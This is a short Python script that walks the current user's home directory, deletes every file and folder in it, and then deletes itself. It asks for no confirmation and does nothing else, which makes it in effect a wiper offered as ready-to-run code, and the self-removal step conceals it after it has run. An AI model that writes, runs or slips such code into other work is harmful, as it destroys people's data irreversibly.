import os
import shutil
import sys

def delete_files_and_dirs(target_dir, exclude_path):
    for root, dirs, files in os.walk(target_dir, topdown=False):
        for name in files:
            file_path = os.path.join(root, name)
            if file_path != exclude_path:
                os.remove(file_path)
        for name in dirs:
            dir_path = os.path.join(root, name)
            if dir_path != exclude_path:
                shutil.rmtree(dir_path)

def main():
    user_profile = os.path.expanduser('~')
    script_path = os.path.abspath(__file__)

    try:
        delete_files_and_dirs(user_profile, script_path)
    except Exception as e:
        print(f"Error: {e}", file=sys.stderr)
        sys.exit(1)

    # Optionally, delete the script itself after everything else has been deleted
    try:
        os.remove(script_path)
    except Exception as e:
        print(f"Error deleting self: {e}", file=sys.stderr)
        sys.exit(1)

if __name__ == "__main__":
    main()
